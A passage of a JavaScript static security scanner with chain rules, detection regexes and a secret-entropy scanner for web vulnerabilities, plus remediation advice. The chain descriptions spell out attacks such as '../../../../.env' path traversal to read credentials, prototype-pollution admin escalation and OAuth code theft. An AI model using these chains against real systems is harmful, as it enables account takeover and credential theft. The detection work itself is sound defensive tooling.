  {a:'Open Redirect',b:'OAuth',combined:'OAuth Authorization Code Theft via Open Redirect',severity:'critical',cwe:'CWE-601',description:'An open redirect on a redirect_uri allowlisted domain allows an attacker to steal OAuth authorization codes. The code is sent to the attacker\'s server, enabling account takeover.'},
  {a:'Open Redirect (User-Controlled URL)',b:'OAuth CSRF',combined:'OAuth Code Theft via Open Redirect',severity:'critical',cwe:'CWE-601',description:'Open redirect combined with OAuth CSRF: attacker redirects the victim\'s authorization code to attacker-controlled infrastructure.'},
  {a:'Mass Assignment',b:'isAdmin',combined:'Privilege Escalation via Mass Assignment',severity:'critical',cwe:'CWE-915',description:'Mass assignment allows setting arbitrary model fields. If the model has an isAdmin or role field, an attacker can promote themselves to administrator with a single request.'},
  {a:'Mass Assignment (req.body Direct to Model)',b:'isAdmin',combined:'Privilege Escalation via Mass Assignment',severity:'critical',cwe:'CWE-915',description:'Direct req.body to model create/update combined with an admin flag field allows one-request privilege escalation.'},
  {a:'Path Traversal',b:'Hardcoded Secret',combined:'Secret Exfiltration via Path Traversal',severity:'critical',cwe:'CWE-22',description:'Path traversal allows reading arbitrary files. Combined with .env files or hardcoded secrets in the codebase, attacker can directly read all credentials via ../../../../.env.'},
  {a:'Path Traversal (User-Controlled Path)',b:'Hardcoded Secret',combined:'Secret Exfiltration via Path Traversal',severity:'critical',cwe:'CWE-22',description:'Path traversal to .env or config files exposes all hardcoded secrets.'},
  {a:'Potential IDOR (User-Controlled ID)',b:'PHI',combined:'HIPAA Breach via IDOR — Patient Data Exposure',severity:'critical',cwe:'CWE-639',description:'IDOR on a route that processes PHI fields means any authenticated user can read any patient\'s medical data by iterating IDs. This is a reportable HIPAA breach.'},
  {a:'Potential Indirect IDOR — findAll Without Ownership Scope',b:'PII',combined:'GDPR Data Breach via Unscoped Collection Query',severity:'critical',cwe:'CWE-639',description:'An unscoped findAll on a model containing PII allows any authenticated user to enumerate all user records. This constitutes a GDPR data breach.'},
  {a:'JWT Decoded Without Signature Verification',b:'Mass Assignment',combined:'JWT Forgery → Mass Assignment → Privilege Escalation',severity:'critical',cwe:'CWE-347',description:'jwt.decode() without verification combined with mass assignment: attacker forges a JWT with admin role, then uses mass assignment to persist the elevated privilege.'},
  {a:'Weak Randomness',b:'Password Reset',combined:'Predictable Password Reset Token',severity:'critical',cwe:'CWE-330',description:'Math.random() used for token generation combined with a password reset flow means reset tokens are predictable and can be brute-forced offline.'},
  {a:'Weak Randomness',b:'Auth Endpoint Without Rate Limiting',combined:'Predictable Token + No Rate Limit = Account Takeover',severity:'critical',cwe:'CWE-330',description:'Weak PRNG tokens on an unrate-limited auth endpoint allow efficient brute-force.'},
  {a:'SQL Injection',b:'Admin Route',combined:'SQL Injection on Admin Endpoint — Direct DB Compromise',severity:'critical',cwe:'CWE-89',description:'SQL injection on an admin route runs with elevated application privileges, potentially allowing DB dump, credential extraction, or schema modification.'},
  {a:'Prototype Pollution',b:'isAdmin',combined:'Prototype Pollution → Privilege Escalation',severity:'critical',cwe:'CWE-1321',description:'Prototype pollution allows setting Object.prototype.isAdmin = true globally. Any subsequent role check using obj.isAdmin will return true for all objects, bypassing authorization.'},
  {a:'Race Condition — Financial Double-Spend',b:'Auth Endpoint Without Rate Limiting',combined:'Double-Spend + No Rate Limit = Unlimited Fund Extraction',severity:'critical',cwe:'CWE-362',description:'A financial race condition with no rate limiting allows an attacker to send hundreds of concurrent requests to drain a balance or multiply credits.'},
];

function crossFindingChain(findings){
  const chains=[];
  const vulnSet=new Set(findings.map(f=>f.vuln));
  const seen=new Set();
  for(const rule of CHAIN_RULES){
    if(!vulnSet.has(rule.a)&&!vulnSet.has(rule.b))continue;
    // Check both directions — a finding might be named slightly differently
    const aFindings=findings.filter(f=>f.vuln===rule.a||f.vuln?.includes(rule.a)||f.sink?.vuln===rule.a);
    const bFindings=findings.filter(f=>f.vuln===rule.b||f.vuln?.includes(rule.b)||f.sink?.vuln===rule.b||
      // Also check if any codebase-wide content suggests the b pattern (e.g. 'isAdmin' field name)
      f.source?.snippet?.includes(rule.b)||f.sink?.snippet?.includes(rule.b));
    if(!aFindings.length||!bFindings.length)continue;
    const chainKey=rule.combined;
    if(seen.has(chainKey))continue;
    seen.add(chainKey);
    const aF=aFindings[0];
    const id=`chain:${rule.combined.replace(/\s/g,'_')}:${aF.file||''}`;
    chains.push({
      id,
      source:{label:rule.a,category:'Chain Analysis',inputType:'chain',variable:'(combined)',line:aF.source?.line||0,file:aF.file||'',snippet:aF.source?.snippet||''},
      sink:{type:'Chained Exploit',severity:rule.severity,vuln:rule.combined,cwe:rule.cwe,stride:'Elevation of Privilege',line:aF.sink?.line||0,file:aF.file||'',snippet:aF.sink?.snippet||'',args:''},
      path:[
        {type:'source',label:`Finding A: ${rule.a}`,line:aF.source?.line||0,snippet:aF.source?.snippet||''},
        {type:'propagation',label:`Chained with: ${rule.b}`,line:0,snippet:''},
        {type:'sink',label:`Combined impact: ${rule.combined}`,line:0,snippet:''}
      ],
      isSanitized:false,sanitizerType:null,
      severity:rule.severity,vuln:rule.combined,cwe:rule.cwe,stride:'Elevation of Privilege',
      file:aF.file||'Multiple',isCrossFile:true,parser:'CHAIN',
      chainDescription:rule.description
    });
  }
  return chains;
}

// ─── GraphQL-specific scanner ─────────────────────────────────────────────────
const GRAPHQL_VULN_PATTERNS=[
  {regex:/__typename\b/g,vuln:"GraphQL Schema Exposure via __typename",severity:"low",cwe:"CWE-200",stride:"Information Disclosure",fix:"Restrict __typename usage in production responses or implement field-level authorization.",code:"// Add to Apollo Server config:\nformatResponse: (response) => {\n  // Strip __typename from production responses if not needed by client\n  return response;\n}"},
  {regex:/@deprecated\s*(?:\(reason\s*:\s*)?["']([^"')]+)["']/g,vuln:"GraphQL Deprecated Field Still Accessible",severity:"low",cwe:"CWE-710",stride:"Information Disclosure",fix:"Remove deprecated fields from schema after migration period. Deprecated fields may lack modern authorization checks.",code:"# Remove deprecated fields from schema\n# or enforce the same auth controls as their replacements"},
  {regex:/type\s+Mutation\s*\{[^}]{0,2000}\}/g,vuln:"GraphQL Mutation Block (Verify Field-Level Auth)",severity:"medium",cwe:"CWE-862",stride:"Elevation of Privilege",fix:"Ensure every mutation resolver verifies authentication and authorization before executing. Use a directive like @auth or check context.user in each resolver.",code:"// Add auth check to every mutation resolver:\nconst resolvers = {\n  Mutation: {\n    updateUser: (_, args, context) => {\n      if (!context.user) throw new AuthenticationError('Not authenticated');\n      // ...\n    }\n  }\n};"},
  {regex:/type\s+Query\s*\{[^}]{0,2000}(?:user|users|admin|internal|private|secret)[^}]{0,500}\}/gi,vuln:"GraphQL Sensitive Query Field (Verify Auth)",severity:"medium",cwe:"CWE-862",stride:"Information Disclosure",fix:"Add authentication/authorization directives or resolver-level checks on sensitive query fields.",code:"# Use @auth directive:\ntype Query {\n  adminUsers: [User] @auth(requires: ADMIN)\n}"},
];

function scanGraphQL(fp, raw){
  const results=[];
  const lines=raw.split('\n');
  for(const pat of GRAPHQL_VULN_PATTERNS){
    const re=new RegExp(pat.regex.source,pat.regex.flags);
    let m;
    while((m=re.exec(raw))!==null){
      const line=raw.substring(0,m.index).split('\n').length;
      const id=`gql:${fp}:${line}:${pat.vuln.replace(/\s/g,'_')}`;
      results.push({
        id,
        source:{label:'GraphQL Schema/Resolver',category:'GraphQL Analysis',inputType:'graphql',variable:'(schema)',line,file:fp,snippet:lines[line-1]?.trim()||''},
        sink:{type:'GraphQL',severity:pat.severity,vuln:pat.vuln,cwe:pat.cwe,stride:pat.stride,line,file:fp,snippet:lines[line-1]?.trim()||'',args:''},
        path:[{type:'source',label:pat.vuln,line,snippet:lines[line-1]?.trim()||''},{type:'sink',label:'GraphQL '+pat.vuln,line,snippet:lines[line-1]?.trim()||''}],
        isSanitized:false,sanitizerType:null,
        severity:pat.severity,vuln:pat.vuln,cwe:pat.cwe,stride:pat.stride,
        file:fp,parser:'GRAPHQL',fix:pat.fix,code:pat.code
      });
    }
  }
  return results;
}

// ════════════════════════════════════════════════════════════════════════════
// ═══ ADVANCED EXPLOIT-PATH DETECTORS & VALIDATORS ════════════════════════════
// ════════════════════════════════════════════════════════════════════════════
// The detectors below extend the scanner toward LLM-style exploit-path reasoning
// without any external API calls:
//   • Call-graph reachability + route-rooted taint
//   • Guard-aware taint (type guards, whitelist, isInteger)
//   • ReDoS / prototype-pollution / SSRF-allowlist / SSTI / file-upload checks
//   • JWT/session config, framework misconfig, crypto-op audit
//   • Shannon entropy secrets, env-gated debug routes, config cross-ref
//   • Session/cookie stored taint, inter-procedural sanitizer inference
//   • Sanitizer effectiveness matrix, payload synthesis, exploitability scoring
//   • Finding de-duplication with multi-detector evidence

// ─── Call-graph + route-rooted taint ─────────────────────────────────────────
// Extracts function definitions and call sites per file; lets us check whether
// a source→sink pair actually routes through a reachable function chain.
function buildCallGraph(fc){
  const graph={};
  for(const[fp,code] of Object.entries(fc)){
    if(!/\.(?:js|jsx|ts|tsx|mjs|cjs)$/i.test(fp))continue;
    const funcs={};
    const fnDecl=/function\s+(\w+)\s*\(/g;
    const fnExpr=/(?:const|let|var)\s+(\w+)\s*=\s*(?:async\s*)?(?:function\b|\([^)]*\)\s*=>)/g;
    const lines=code.split("\n");
    let m;
    while((m=fnDecl.exec(code))!==null){
      const line=code.substring(0,m.index).split("\n").length;
      funcs[m[1]]={line,calls:new Set(),file:fp};
    }
    while((m=fnExpr.exec(code))!==null){
      const line=code.substring(0,m.index).split("\n").length;
      funcs[m[1]]={line,calls:new Set(),file:fp};
    }
    // Attribute call sites to nearest enclosing function by line proximity
    const callRe=/\b(\w+)\s*\(/g;
    const ordered=Object.entries(funcs).sort((a,b)=>a[1].line-b[1].line);
    while((m=callRe.exec(code))!==null){
      const name=m[1];
      if(!/^(?:if|for|while|switch|catch|return|typeof|new|function|async|await|throw)$/.test(name)){
        const line=code.substring(0,m.index).split("\n").length;
        let owner=null;
        for(const[fn,info] of ordered)if(info.line<=line)owner=fn;else break;
        if(owner&&funcs[owner])funcs[owner].calls.add(name);
      }
    }
    graph[fp]=funcs;
  }
  return graph;
}

// Annotate findings with route-root status and call-graph reachability.
// reachable === true when source sits inside a function reachable from a route handler.
function annotateReachability(findings,routes,callGraph,fc){
  const routeHandlerLines={};
  for(const r of routes){
    if(!routeHandlerLines[r.file])routeHandlerLines[r.file]=[];
    routeHandlerLines[r.file].push(r.line);
  }
  for(const f of findings){
    const fp=(f.source?.file||f.file||"").split(" -> ")[0];
    const srcLine=f.source?.line||0;
    const rl=routeHandlerLines[fp]||[];
    // Within 60 lines of a route declaration we consider this source route-rooted
    const routeRooted=rl.some(l=>Math.abs(l-srcLine)<60);
    f.routeRooted=routeRooted;
    // Cheap function-of-source lookup via callGraph
    const funcs=callGraph[fp]||{};
    let enclosing=null;
    for(const[fn,info] of Object.entries(funcs))
      if(info.line<=srcLine&&(!enclosing||info.line>funcs[enclosing].line))enclosing=fn;
    f.enclosingFunction=enclosing||null;
    // Reachable when route-rooted OR enclosingFunction is called from any function
    // declared near a route in the same file
    if(routeRooted){f.reachable=true;continue;}
    let reachable=false;
    if(enclosing){
      for(const rLine of rl){
        let nearestAtRoute=null;
        for(const[fn,info] of Object.entries(funcs))
          if(info.line<=rLine&&(!nearestAtRoute||info.line>funcs[nearestAtRoute].line))nearestAtRoute=fn;
        if(nearestAtRoute&&funcs[nearestAtRoute]?.calls?.has(enclosing)){reachable=true;break;}
      }
    }
    f.reachable=reachable;
  }
  return findings;
}

// ─── Guard-aware taint (regex fallback; AST version lives in performASTAnalysis) ─
// Scan for guard patterns in the 5 lines preceding each finding's sink site.
const GUARD_PATTERNS=[
  {regex:/typeof\s+\w+\s*===?\s*['"](?:string|number|boolean|object)['"]/g,name:"typeof-guard"},
  {regex:/Number\.isInteger\s*\(/g,name:"isInteger"},
  {regex:/uuid(?:\.validate|Validate|\.parse)\s*\(/g,name:"uuid-validate"},
  {regex:/(?:\.includes|\.indexOf|\bin\b)\s*\([^)]*\)/g,name:"allowlist-check"},
  {regex:/(?:Joi|yup|zod|z)\s*\.\s*(?:object|string|number|validate|parse)/g,name:"schema-validate"},
  {regex:/(?:isNaN|isFinite|Array\.isArray)\s*\(/g,name:"type-check"},
  {regex:/\.(?:match|test)\s*\(\s*\/\^[^/]{3,}\$?\//g,name:"anchored-regex-validate"},
];
function detectGuardsForFinding(f,fc){
  const fp=(f.sink?.file||f.file||"").split(" -> ").pop();
  const code=fc[fp];if(!code)return f;
  const lines=code.split("\n");
  const sinkLine=f.sink?.line||0;
  const before=lines.slice(Math.max(0,sinkLine-10),sinkLine).join("\n");
  const guards=[];
  for(const g of GUARD_PATTERNS){
    const re=new RegExp(g.regex.source,g.regex.flags);
    if(re.test(before))guards.push(g.name);
  }
  if(guards.length){
    f.guards=guards;
    f.guardedConfidence=true;
  }
  return f;
}

// ─── ReDoS detection: catastrophic backtracking patterns ─────────────────────
function scanReDoS(fp,raw){
  const out=[];
  const lines=raw.split("\n");
  // Regex literal /…/flags or new RegExp('…')
  const litRe=/\/((?:\\.|[^\/\n])+)\/[gimsuy]{0,5}/g;
  const ctorRe=/new\s+RegExp\s*\(\s*['"`]((?:\\.|[^'"`\n])+)['"`]/g;
  const catastrophic=[
    /\(\w?\+\)[+*]/,                        // (a+)+
    /\(\w?\*\)[+*]/,                        // (a*)+
    /\((?:[^()|]+\|[^()|]+)\)[+*]/,         // (a|a)*
    /\([^()]+\)\{\d+,\}[+*]/,               // (...){n,}+
    /\(\?:[^()]*\+\)\+/,                    // (?:a+)+
  ];
  function check(match,re){
    let m;while((m=re.exec(raw))!==null){
      const body=m[1];
      if(!body||body.length<3)continue;
      for(const c of catastrophic){
        if(c.test(body)){
          const line=raw.substring(0,m.index).split("\n").length;
          out.push({
            vuln:"Regex ReDoS — Catastrophic Backtracking",
            severity:"medium",cwe:"CWE-1333",stride:"Denial of Service",
            fix:"Rewrite the regex to avoid nested quantifiers and overlapping alternation. Consider the `re2` library for linear-time matching.",
            code:"// Use the Google RE2 library which guarantees linear-time evaluation:\nconst RE2 = require('re2');\nconst re = new RE2(pattern);",
            file:fp,line,snippet:lines[line-1]?.trim()||m[0]
          });
          break;
        }
      }
    }
  }
  check("lit",litRe);
  check("ctor",ctorRe);
  return out;
}

// ─── Prototype pollution dynamic-bracket sink (extra patterns) ───────────────
const EXTRA_STRUCTURAL_PATTERNS=[
  // Dynamic bracket assignment: obj[k1][k2] = value with user-controlled k1/k2
  {regex:/\w+\s*\[\s*(?:req\.|body\.|query\.|params\.)[^\]]{0,60}\]\s*(?:\[[^\]]{0,60}\])?\s*=/g,
   type:"Proto Pollution",vuln:"Prototype Pollution (Dynamic Bracket Assignment with User Key)",severity:"critical",cwe:"CWE-1321",stride:"Tampering",
   fix:"Reject __proto__, constructor, prototype keys before any bracket assignment with user-controlled keys."},
  // Object.assign(target, userInput) explicit
  {regex:/Object\.assign\s*\(\s*\w+\s*,\s*(?:req\.|body|\w+\.body)\b/g,
   type:"Object Merge",vuln:"Prototype Pollution (Object.assign with User Object)",severity:"high",cwe:"CWE-1321",stride:"Tampering",
   fix:"Destructure allowlisted fields; never merge raw request bodies into objects."},
  // SSTI — render with user-controlled template string
  {regex:/(?:res|response)\s*\.\s*render\s*\(\s*(?:req\.|body\.|query\.|params\.)/g,
   type:"Template Render",vuln:"SSTI — User-Controlled Template Name",severity:"critical",cwe:"CWE-1336",stride:"Elevation of Privilege",
   fix:"Render static template names only; pass user data as context object, never as the template identifier."},
  {regex:/(?:handlebars|Handlebars|pug|ejs|nunjucks|Mustache)\s*\.\s*compile\s*\(\s*(?:req\.|body\.|query\.|params\.)/g,
   type:"Template Compile",vuln:"SSTI — User-Controlled Template Source",severity:"critical",cwe:"CWE-1336",stride:"Elevation of Privilege",
   fix:"Never compile user-controlled template strings. Use pre-compiled templates and pass user input only as context data."},
  // Java SSTI — Velocity / Thymeleaf expressions from user input
  {regex:/(?:Velocity|Template|ctx)\s*\.\s*(?:evaluate|merge|process)\s*\([^)]*(?:request\.|@RequestParam)/g,
   type:"Template Compile",vuln:"Java SSTI (Velocity/Thymeleaf with User Input)",severity:"critical",cwe:"CWE-1336",stride:"Elevation of Privilege",
   fix:"Never render user-controlled templates in Velocity/Thymeleaf. Pass user data as model attributes only."},
  // SSRF allowlist gap — fetch/axios called without a preceding URL allowlist check (best-effort)
  {regex:/\b(?:fetch|axios\.(?:get|post|request)|got\s*\(|http\.get|https\.get)\s*\(\s*(?:req\.|body\.|query\.|params\.)[^)]{0,80}\)(?![^;]{0,200}(?:allowlist|allowedHost|allowed_hosts|isPrivateIP|whitelist))/gi,
   type:"Outbound HTTP",vuln:"SSRF (No Hostname Allowlist Detected)",severity:"high",cwe:"CWE-918",stride:"Spoofing",
   fix:"Wrap outbound URL with `new URL(...)` and validate hostname ∈ allowlist, reject RFC-1918 and 169.254.169.254 before issuing the request."},
  // Math.random used for security-sensitive values
  {regex:/(?:reset|password|token|otp|pin|session|nonce|salt)\w*\s*=\s*Math\.random\s*\(/gi,
   type:"Weak PRNG",vuln:"Math.random Used for Security Value",severity:"high",cwe:"CWE-338",stride:"Spoofing",
   fix:"Use crypto.randomBytes(32) or crypto.randomUUID() for tokens, salts, and session IDs."},
  // Insecure cookie — missing secure/httpOnly combination
  {regex:/res\s*\.\s*cookie\s*\(\s*['"`][^'"`]+['"`]\s*,[^,)]+,\s*\{(?![^}]{0,300}httpOnly\s*:\s*true)[^}]{0,300}\}/g,
   type:"Cookie Config",vuln:"Cookie Set Without httpOnly Flag",severity:"medium",cwe:"CWE-1004",stride:"Information Disclosure",
   fix:"Set {httpOnly:true, secure:true, sameSite:'strict'} on all session/auth cookies."},
  // Express trust proxy: setting to true blindly
  {regex:/app\s*\.\s*set\s*\(\s*['"]trust proxy['"]\s*,\s*true\s*\)/g,
   type:"Framework Config",vuln:"Express trust proxy Enabled Globally",severity:"medium",cwe:"CWE-348",stride:"Spoofing",
   fix:"Set `trust proxy` to the specific upstream proxy IP or subnet, never blanket true."},
  // x-powered-by not disabled (hint-level signal; low severity)
  {regex:/(?:express\s*\(\s*\)|app\s*=\s*express)/g,
   type:"Framework Config",vuln:"Verify x-powered-by Header is Disabled",severity:"low",cwe:"CWE-200",stride:"Information Disclosure",
   fix:"Call app.disable('x-powered-by') or use helmet() to strip fingerprinting headers."},
  // CORS with credentials + wildcard origin
  {regex:/cors\s*\(\s*\{[^}]{0,300}credentials\s*:\s*true[^}]{0,300}origin\s*:\s*['"]\*['"]/g,
   type:"CORS Config",vuln:"CORS Wildcard Origin with Credentials",severity:"critical",cwe:"CWE-942",stride:"Spoofing",
   fix:"Never combine `origin:'*'` with `credentials:true`. Enumerate trusted origins explicitly."},
  // Django DEBUG = True
  {regex:/DEBUG\s*=\s*True/g,
   type:"Framework Config",vuln:"Django DEBUG Enabled in Source",severity:"medium",cwe:"CWE-489",stride:"Information Disclosure",
   fix:"Load DEBUG from env with secure default: DEBUG = os.environ.get('DJANGO_DEBUG','False')=='True'."},
  // Django ALLOWED_HOSTS = ['*']
  {regex:/ALLOWED_HOSTS\s*=\s*\[\s*['"]\*['"]\s*\]/g,
   type:"Framework Config",vuln:"Django ALLOWED_HOSTS Wildcard",severity:"high",cwe:"CWE-20",stride:"Spoofing",
   fix:"Restrict ALLOWED_HOSTS to explicit production domain names."},
  // Spring @CrossOrigin wildcard
  {regex:/@CrossOrigin\s*\(\s*origins\s*=\s*['"]\*['"]\s*\)/g,
   type:"Framework Config",vuln:"Spring @CrossOrigin Wildcard Origin",severity:"medium",cwe:"CWE-942",stride:"Spoofing",
   fix:"Specify explicit allowed origins on @CrossOrigin. Avoid wildcards on authenticated endpoints."},
  // File upload — multer/formidable without limits
  {regex:/multer\s*\(\s*\{(?![^}]{0,400}(?:limits|fileSize|fileFilter))/g,
   type:"File Upload",vuln:"multer Without size/type Limits",severity:"medium",cwe:"CWE-434",stride:"Elevation of Privilege",
   fix:"Configure multer with limits:{fileSize:MB}, fileFilter:(req,file,cb)=>allowedMimes.includes(file.mimetype)."},
  // File upload saved inside public/ or ./uploads near webroot
  {regex:/(?:cb|callback)\s*\(\s*null\s*,\s*['"`](?:\.\/)?(?:public|static|www|html)\/uploads?/g,
   type:"File Upload",vuln:"File Upload Directory Inside Web Root",severity:"high",cwe:"CWE-434",stride:"Elevation of Privilege",
   fix:"Store uploaded files outside the web-served directory. Serve them via a controller that verifies ownership."},
  // ── JWT / session config ──────────────────────────────────────────────────
  {regex:/jwt\.sign\s*\([^)]*expiresIn\s*:\s*['"]\s*['"]/g,
   type:"JWT Config",vuln:"JWT Signed Without expiresIn",severity:"medium",cwe:"CWE-613",stride:"Spoofing",
   fix:"Always set expiresIn on jwt.sign(). Tokens without expiry cannot be revoked naturally."},
  {regex:/(?:jwt|jsonwebtoken)\.sign\s*\([^,]+,\s*['"`][^'"`]{1,15}['"`]/g,
   type:"JWT Config",vuln:"JWT Signing Key Too Short",severity:"high",cwe:"CWE-326",stride:"Spoofing",
   fix:"HMAC signing keys should be ≥ 32 bytes and loaded from env/secrets manager."},
  {regex:/session\s*\(\s*\{[^}]*cookie\s*:\s*\{(?![^}]{0,300}secure\s*:\s*true)/g,
   type:"Session Config",vuln:"Session Cookie Missing secure Flag",severity:"medium",cwe:"CWE-614",stride:"Information Disclosure",
   fix:"Set cookie: { httpOnly:true, secure:true, sameSite:'strict' } on express-session."},
  // ── Crypto-op audit ───────────────────────────────────────────────────────
  {regex:/crypto\.createCipher\s*\(/g,
   type:"Weak Crypto",vuln:"Deprecated createCipher (MD5 KDF)",severity:"high",cwe:"CWE-327",stride:"Information Disclosure",
   fix:"Use crypto.createCipheriv() with an explicit IV. createCipher derives the key via MD5 and is deprecated."},
  {regex:/['"]aes-\d+-ecb['"]/gi,
   type:"Weak Crypto",vuln:"AES-ECB Mode Selected",severity:"high",cwe:"CWE-327",stride:"Information Disclosure",
   fix:"Never use ECB. Use AES-256-GCM or AES-256-CBC with a random IV per message."},
  {regex:/Buffer\.alloc\s*\(\s*16\s*\)[^;]{0,80}createCipheriv|createCipheriv\s*\([^,]+,[^,]+,\s*Buffer\.alloc\s*\(/g,
   type:"Weak Crypto",vuln:"Static IV (Buffer.alloc Zero IV) in Cipher",severity:"critical",cwe:"CWE-329",stride:"Information Disclosure",
   fix:"Generate a fresh IV per message: crypto.randomBytes(16) for CBC, randomBytes(12) for GCM."},
  {regex:/pbkdf2(?:Sync)?\s*\(\s*[^,]+,\s*[^,]+,\s*(?:\d{1,4})\b/g,
   type:"Weak Crypto",vuln:"PBKDF2 Iteration Count Too Low",severity:"medium",cwe:"CWE-916",stride:"Information Disclosure",
   fix:"Use ≥ 100000 iterations for PBKDF2-HMAC-SHA256, per OWASP 2024 guidance."},
  {regex:/bcrypt\.(?:hash|genSaltSync|genSalt)\s*\(\s*[^,]+,\s*(?:[1-9]\b|10\b)\)/g,
   type:"Weak Crypto",vuln:"bcrypt Rounds Below 10 (Weak Work Factor)",severity:"medium",cwe:"CWE-916",stride:"Information Disclosure",
   fix:"Use bcrypt rounds ≥ 12 for password hashing."},
  // ── Env-conditional debug routes ──────────────────────────────────────────
  {regex:/if\s*\(\s*process\.env\.NODE_ENV\s*(?:!==?)\s*['"]production['"]\s*\)\s*\{[^}]{0,400}(?:app|router)\.(?:get|post|all|use)\s*\(/g,
   type:"Env-Gated Route",vuln:"Debug/Dev Route Gated Only by NODE_ENV",severity:"medium",cwe:"CWE-489",stride:"Information Disclosure",
   fix:"Delete debug routes from production builds. NODE_ENV is unreliable as a security boundary."},
];

function scanExtraStructural(fp,raw){
  const cleaned=stripNoise(raw);
  const lines=raw.split('\n');
  const findings=[];
  for(const pat of EXTRA_STRUCTURAL_PATTERNS){
    const re=new RegExp(pat.regex.source,pat.regex.flags);
    let m;
    while((m=re.exec(cleaned))){
      const line=lineAt(cleaned,m.index);
      const snippet=lines[line-1]?.trim()||'';
      const id=`xstruct:${fp}:${line}:${pat.vuln.replace(/\s/g,'_')}`;
      if(!findings.find(f=>f.id===id)){
        findings.push({
          id,
          source:{label:'Structural Pattern',category:'Advanced Structural',inputType:'structural',variable:'(pattern)',line,file:fp,snippet},
          sink:{type:pat.type,severity:pat.severity,vuln:pat.vuln,cwe:pat.cwe,stride:pat.stride,line,file:fp,snippet,args:snippet},
          path:[
            {type:'source',label:'Advanced Structural: '+pat.vuln,line,snippet},
            {type:'sink',label:pat.type+' at line '+line,line,snippet}
          ],
          isSanitized:false,sanitizerType:null,
          severity:pat.severity,vuln:pat.vuln,cwe:pat.cwe,stride:pat.stride,
          file:fp,parser:'ADV_STRUCTURAL',fix:pat.fix
        });
      }
    }
  }
  return findings;
}

// ─── Shannon-entropy secret scanner ──────────────────────────────────────────
function shannonEntropy(s){
  const freq={};
  for(const ch of s)freq[ch]=(freq[ch]||0)+1;
  const len=s.length;let e=0;
  for(const k in freq){const p=freq[k]/len;e-=p*Math.log2(p);}
  return e;
}
const SAFE_ENTROPY_PREFIXES=/(?:https?:\/\/|data:|image\/|text\/|application\/|sha\d+[:=-]|md5[:=-]|[0-9a-f]{8}-[0-9a-f]{4}-|\/\/|lorem|ipsum|aaa+|xxx+|placeholder|example|your_|changeme)/i;

// FP-5: structural recognizers for high-entropy non-secrets. Each entry returns
// the suppression reason it represents. Anything matching here is NOT a secret.
const NON_SECRET_RECOGNIZERS=[
  {re:/^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i, reason:'uuid'},
  // Pure hex digest of a common length (MD5/SHA1/SHA256/SHA512)
  {re:/^[0-9a-f]{32}$|^[0-9a-f]{40}$|^[0-9a-f]{64}$|^[0-9a-f]{128}$/i, reason:'hex-digest'},
  // Hex-prefixed public-key-shaped values (0x...)
  {re:/^0x[0-9a-f]{40,128}$/i, reason:'hex-public-key'},
  // npm/yarn lockfile integrity hashes (already partially handled by SAFE_ENTROPY_PREFIXES, kept for clarity)
  {re:/^sha(?:1|256|384|512)-[A-Za-z0-9+/=]+$/, reason:'integrity-hash'},
  // 3-part JWT (header.payload.signature) — usually example/cached, not committed live secrets
  {re:/^eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/, reason:'jwt-three-part'},
];
const DOC_CONTEXT_RE=/(?:^|\W)(?:example|sample|e\.g\.|i\.e\.|for\s+instance|dummy|like:|such\s+as)(?:\W|$)/i;
function _isLikelyNonSecret(v, ctxLine, surroundingLines){
  for (const r of NON_SECRET_RECOGNIZERS) if (r.re.test(v)) return r.reason;
  // Doc-context gate: surrounding 3 lines clearly indicate documentation/example
  if (DOC_CONTEXT_RE.test(surroundingLines)) return 'doc-context';
  return null;
}

function scanEntropySecrets(fp,raw){
  if(raw.length>400000)return[]; // skip huge blobs
  const out=[];
  const lines=raw.split("\n");
  const re=/['"`]([A-Za-z0-9+/=_\-.]{24,200})['"`]/g; // include `.` so JWTs are captured here for suppression
  let m;
  while((m=re.exec(raw))!==null){
    const v=m[1];
    if(SAFE_ENTROPY_PREFIXES.test(v))continue;
    if(!/[A-Z]/.test(v)&&!/[a-z]/.test(v))continue; // pure-number = likely not a key
    if(/^\d+$/.test(v))continue;
    const e=shannonEntropy(v);
    if(e<4.5)continue;
    const line=raw.substring(0,m.index).split("\n").length;
    const ctx=lines[line-1]||"";
    if(!/(?:key|secret|token|password|pwd|api|auth|cred|private|bearer|salt|signature|cert)/i.test(ctx))continue;
    // FP-5: structural / doc-context suppression
    const surrounding=lines.slice(Math.max(0,line-3),Math.min(lines.length,line+1)).join("\n");
    const nonSecretReason=_isLikelyNonSecret(v, ctx, surrounding);
    if (nonSecretReason) {
      _suppressionLog.push({vuln:"High-Entropy Credential Candidate",file:fp,line,snippet:ctx.trim(),reason:'entropy-'+nonSecretReason});
      continue;
    }
    const masked=v.substring(0,4)+"…"+v.substring(v.length-4);
    out.push({
      vuln:"High-Entropy Credential Candidate",
      severity:"high",cwe:"CWE-798",stride:"Information Disclosure",
      fix:"Replace with environment variable or secrets manager reference; rotate the value immediately.",
      code:`// BEFORE\nconst secret = "${masked}";\n\n// AFTER\nconst secret = process.env.APP_SECRET;`,
      file:fp,line,snippet:ctx.trim(),masked,entropy:e.toFixed(2)
    });
  }
  return out;
}

// ─── TODO/FIXME adjacent to auth/crypto ──────────────────────────────────────
function scanTodosNearSecurity(fp,raw){
  const lines=raw.split("\n");
  const out=[];
  for(let i=0;i<lines.length;i++){
    const ln=lines[i];
    if(!/\b(?:TODO|FIXME|HACK|XXX|BUG|TEMP)\b/.test(ln))continue;
    const window=lines.slice(Math.max(0,i-3),Math.min(lines.length,i+4)).join(" ");
    if(!/(?:auth|jwt|token|password|verify|hash|crypto|session|cookie|login|permission|role|rbac|admin)/i.test(window))continue;
    out.push({
      vuln:"Known-Broken Code Marker Near Security-Sensitive Logic",
      severity:"medium",cwe:"CWE-1077",stride:"Tampering",
      fix:"Review the TODO/FIXME. Known-broken comments next to auth/crypto code often indicate unfinished hardening.",
      code:`// File: ${fp}:${i+1}\n// ${ln.trim()}`,
      file:fp,line:i+1,snippet:ln.trim()
    });
  }
  return out;
}

// ─── Config-file cross-ref (.env.example, docker-compose.yml) ───────────────
function scanConfigFiles(fc){
  const out=[];
  for(const[fp,code] of Object.entries(fc)){
    const base=fp.split("/").pop().toLowerCase();
    if(/^\.env(\.example|\.sample|\.template)?$/.test(base)||base.endsWith(".env")){
      const lines=code.split("\n");
      for(let i=0;i<lines.length;i++){
        const ln=lines[i].trim();
        const m=ln.match(/^([A-Z][A-Z0-9_]+)\s*=\s*(.+)$/);
        if(!m)continue;
        const[,k,v]=m;
